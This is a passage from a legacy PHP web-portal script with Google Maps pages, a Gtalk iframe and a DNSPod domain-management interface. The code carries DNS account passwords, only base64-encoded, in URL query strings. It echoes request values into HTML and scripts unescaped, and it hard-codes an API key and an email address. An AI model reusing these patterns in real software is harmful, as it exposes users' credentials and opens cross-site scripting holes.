                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<?php 
$style = new css();
?>
<script type="text/javascript">
 function so(){
  if(document.getElementById("start").value == "" && document.getElementById("end").value == ""){
                codeAddress();
  }     
  else if(document.getElementById("start").value != "" && document.getElementById("end").value != ""){
   calcRoute();
  }
 }
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="33" class="tdtbg" valign="center">
                        <input <?php  $style->textarea("#FCFC9D",""); ?> id="address" type="textbox" value="<?php echo iconv("gb2312","utf-8","");?>">
                        <?php echo formatchar('出发地')?>
                        <input <?php  $style->textarea("#FCFC9D",""); ?> id="start" type="textbox" value="<?php echo iconv("gb2312","utf-8","");?>">
                        <?php echo formatchar('目的地')?>
                        <input <?php  $style->textarea("#FCFC9D",""); ?> id="end" type="textbox" value="<?php echo iconv("gb2312","utf-8","");?>">
                        <?php echo formatchar('方式');?>
                        <select style="height:20px;width:65px;font-size:11px" <?php  $style->selectarea("#FCFC9D",""); ?> id="mode" onchange="calcRoute();">
                                <option value="DRIVING"><?php echo formatchar("驾车");?></option>
                                <option value="WALKING"><?php echo formatchar("步行");?></option>
                                <option value="BICYCLING"><?php echo formatchar("骑车");?></option>
                        </select> 
                        &nbsp;&nbsp;<input type="submit" class="button" value=" <?php echo formatchar(' Go ')?> " onclick="so()">
                </td>
        </tr>   
</table>
<table width="95%" height="82%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center">
                <td>
                <?php 
                $google_map->googleMapload();
                ?>
                </td>
        </tr>
</table>                
<?php 
$style->footer();
exit;
} // gmap function end
?>

<?php 
function safe360(){

exit;   
}
?>

<?php 
function gmap2(){ // gmap function start
header('Content-Type: text/html; charset=utf-8');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - ".formatchar('地图'));
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;sensor=true&amp;key=ABQIAAAADVbfv3-SPGCdzoPpVHlEpRRdLvjvuwSGx4dYIDu-eViBYgHFIBTaIpsrAQzC9wj7WY44-NGZNPtjmg" type="text/javascript"></script>
<script type="text/javascript">
    google.load('maps', '2');

    var map;
    var geocoder = null;
    var addressMarker;

var marker;
var overlayInstance = null;
var client;
var lastMarkerLocation;
var panorama;
var mapT;
 
var maximizeclickHandler = function() {};
var maximizeendHandler = function() {};
var infowindowbeforecloseHandler = function() {};

 
    function initialize() {

      map = new GMap2(document.getElementById("map"));
      map.setCenter(new GLatLng(37.4328, -122.077), 13);
 
      // The following line makes the map Earth-enabled by adding the
      // "Earth" button to the map type control.  Note that you still
      // need to add a map type control (GMapTypeControl,
      // GMenuMapTypeControl, or GHierarchicalMapTypeControl) to the
      // the map (as is done below) for the "Earth" button and the rest
      // of the map type buttons to show up at all.
      map.addMapType(G_SATELLITE_3D_MAP);
 
      map.addControl(new GHierarchicalMapTypeControl());
      map.addControl(new GLargeMapControl());
      //map.setMapType(G_HYBRID_MAP);
      map.addControl(new GMapTypeControl());      
      map.enableContinuousZoom();

      geocoder = new GClientGeocoder();
      geocoder.setCache(null);
      showAddress('<?php echo iconv("gb2312","utf-8","北京")?>','');
}
 
    function showAddress(address, countryCode) {
      if (geocoder) {
        geocoder.setBaseCountryCode(countryCode);
        geocoder.getLatLng(address,
          function(point) {
            if (!point) {
              alert(address + " not found");
            } else {
              if (addressMarker) {
                map.removeOverlay(addressMarker);
              }
              addressMarker = new GMarker(point,13);
              map.setCenter(point);
              map.addOverlay(addressMarker);
            }
          }
        );
      }
    }

    </script>     

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<?php 
$style = new css();
?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="33" class="tdtbg" valign="center">
                        <input style="height:20px;width:85px;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?> id="address" type="textbox" value="<?php echo iconv("gb2312","utf-8","")?>">
                        &nbsp;&nbsp;<input type="submit" class="button" value=" <?php echo formatchar(' Go ')?> " onclick="javascript:showAddress(document.getElementById('address').value,'');">
                </td>
        </tr>   
</table>
<table width="95%" height="82%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center">
                <td>
                <body onload="initialize()" onunload="GUnload">
                <div id="map" class="map" style="width:100%;height:100%"></div>
                </td>
        </tr>
</table>                
<?php 
$style->footer();
exit;
} // gmap function end
?>

<?php 
function gtalk(){ // gmap function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 聊天");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="90%" height="" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="15">
                </td>
        </tr>   
</table>
<table width="95%" height="82%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center" style="border:0">
                <td align="center" id="gtalk">
                </td>
        </tr>
</table>
<script language="JavaScript" type="text/javascript">
        document.getElementById('gtalk').innerHTML = '<iframe name="gtalk" tabIndex="1" title="X3193 - Gtalk" width="100%" height="100%" border="0" id="gtalk" src="http://talkgadget.google.com/talkgadget/popout/?emailid=<?php  echo encodeuri("xcy6272003@gmail.com");?>" frameborder="0" scrolling="no" stylr="width:100%;height:100%"><iframe>'
</script>
<?php 
$style->footer();
exit;
} // gmap function end
?>

<?php 
function dnspod(){ // dnspod function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 域名");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">            
                        <?php  
                        	 IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<?php 

$dnspodu = trim(request("uname"));
$dnspodp = trim(request("pwd"));

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if ($stract == ""){
        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=main"."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Domain.List"){      
        if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }
                }       
                redirect(scriptpath()."?api=dnspod&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        }
        $dnspodu = trim(request("uname"));
        $dnspodp = trim(request("pwd"));
        if (trim(request("logout")) != ""){
                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                session_register("dnspod");
}                 

                $_SESSION["dnspod"]["uname"] = "";      
                $_SESSION["dnspod"]["pwd"] = "";        
                redirect(scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=&urlflag=1");
                break;
        }
        elseif ($_SESSION["dnspod"]["uname"] != "" && $_SESSION["dnspod"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["dnspod"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["dnspod"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        }       
        elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                session_register("dnspod");
}
                $_SESSION["dnspod"]["uname"] = trim(request("uname"));  
                $_SESSION["dnspod"]["pwd"] = trim(request("pwd"));      
        }       
        elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=&pwd=&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine");
        }       
}
elseif ($stract == "Domain.Create" && trim($_POST["domain"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domain=".encodeuri(trim(request("domain")))."&refer=".encodeuri(trim(request("refer")))."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Record.Create" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domainid=".encodeuri(trim(request("domainid")))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Record.Modify" && trim($_POST["sub_domain"]) != "" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != "" && trim($_POST["ttl"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domain_id=".encodeuri(trim(request("domain_id")))."&record_id=".trim(request("record_id"))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&edit=0&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode")));
        break;
}       

$dnspodpwd = base64_decode(trim(request("pwd")));
$dnspoduname = base64_decode(trim(request("uname")));

?>
<table width="90%" height="" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

switch ($stract) {
        case "main": // action - main start
						if ($_SESSION["dnspod"]["uname"] != "" && $_SESSION["dnspod"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["dnspod"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["dnspod"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim("Domain.List"))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        		}        
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php  echo ScriptPath(); ?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.List");?>" method="post" name="dnspod">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="<?php  echo encodeuri(trim(request("pwd")));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> style="height:20px;font-size:11px" maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" style="height:14px;" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                // action - main end
                break;
        case "Domain.List": // action - Domain.List start
                $dnspod = new dnspod_class();
                $dnspoddomainlist = $dnspod->dnspoddomainlist($dnspoduname,$dnspodpwd,trim(request('type')),$page,$pagesize);
                //print_r($dnspoddomainlist);
                //return;
                if ($dnspoddomainlist["code"] == '1'){
                }       
                else{
 
                              //AlertBack ($dnspoddomainlist["message"] , 2);           
        											redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domainid=".encodeuri(trim(request("domainid")))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode"))."&logout=1");
        											break;
                }
                //return;
                
                if ($dnspoddomainlist['length'] == $pagesize) $strpagesize = $pagesize; else $strpagesize = $dnspoddomainlist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.dnspod.chidd'+i))
 {
  eval('document.dnspod.chidd'+i).checked = document.dnspod.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的域名吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.dnspod.submit();
}
function doitem(act)
{
 if(!confirm('确定更改选中的域名状态吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&status=' + act;
 document.dnspod.submit();
}
</script>       
                <?php 
                $totalitem = $dnspoddomainlist['totalitem'];
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $totalitem;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> - <?php if (trim(request("type"))!="mine" && trim(request("type"))!=""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine";?>" style="color:#000000">Mine</a><?php }elseif (trim(request("type"))=="mine" || trim(request("type"))==""){echo "Mine";}?>/<?php if (trim(request("type"))!="share" || trim(request("type"))==""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=share";?>" style="color:#000000">Shared</a><?php }elseif (trim(request('type')=='share')){echo "Shared";}?> <?php  if (trim($_SESSION["dnspod"]["uname"]) != "" && trim($_SESSION["dnspod"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&logout=1";?>" target="_self">退出</a><?php  } ?>] </td>
        </tr>
</table>        
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="dnspod" method="post" action="">
                <?php 
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=25%>
                        域名值
                </td>
                <td align="center" width=10%>
                        等级
                </td> 
                <td align="center" width=10%>
                        记录数
                </td>
                <td align="center" width=25%>
                        共享来源
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&skin=<?php  echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php  echo encodeuri(trim(request("pwd")));?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page;?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a> <a style="color:#000000" href="javascript:doitem('enable');">启</a>/<a style="color:#000000" href="javascript:doitem('disable');">停</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $strpagesize-1;$i++){
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $domainid = $dnspoddomainlist[$i]['domainid'];
                        $domain = $dnspoddomainlist[$i]['domain'];
                        $domaingrade = $dnspoddomainlist[$i]['domaingrade'];
                        $domainstatus = $dnspoddomainlist[$i]['domainstatus'];
                        $domainrecords = $dnspoddomainlist[$i]['domainrecords'];
                        $domainshared = $dnspoddomainlist[$i]['domainshared'];

                        if ($domainstatus == "enable" || $domainstatus == "1")
                                echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=1&skin=".$skincolor."&domainid=".$domainid."&topdomain=".encodeuri($domain)."&grade=".encodeuri($domaingrade)."'>".$domain."</a>";
                        else    
                                echo " ".$domain." ";
                ?>
                </td>
                <td align="center">
                        <?php echo $domaingrade;?> 
                </td> 
                <td align="center">
                        <?php echo $domainrecords;?>
                </td>
                <td align="center">
                        <?php echo $domainshared;?>
                </td>
                <td align="center"><a style="color:#000000" href="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>&domainid=<?php echo $domainid;?>&topdomain=<?php echo $domain;?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri($domaingrade)?>">添加</a> <a style="color:#000000" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri($domainid)."&type=".encodeuri($type)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a> <?php if ($domainstatus == 'enable' || $domainstatus == '1'){?><a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">停用</a><?php }else{?><a style="color:#000000" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">启用</a><?php }?> 导入 导出</td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&type=".trim(request("type"))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&type=".trim(request("type"))."'>下一页</a> ";
                				
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                				
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&type=".trim(request("type"))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
                // action - Domain.List start
        case "Domain.Create": // action - Domain.Create start
                if (trim(request("domain")) == ""){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&pagesize=<?php  echo encodeuri($pagesize)."&page=".trim(request("page"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp域名：<input type="text" class="text" name="domain" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER["HTTP_REFERER"]))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                }
                elseif (trim(request("domain")) != ""){
                        $dnspod = new dnspod_class();
                        $dnspoddomaincreate = $dnspod->dnspoddomaincreate($dnspoduname,$dnspodpwd,trim(request('domain')));
                        $timeout = "5000";
                        if ($dnspoddomaincreate['code'] == "1"){
                        ?>
<script language=javascript>
        alert("请手动更改 \n   <?php  echo $dnspoddomaincreate['punycode'];?> \n NS记录为: \n f1g1ns1.dnspod.net  \n f1g1ns2.dnspod.net ");
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名添加成功！域名ID：<?php  echo $dnspoddomaincreate['id'];?> 实际域名：<?php echo $dnspoddomaincreate['punycode']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                
                        }       
                        else{   
                        ?>
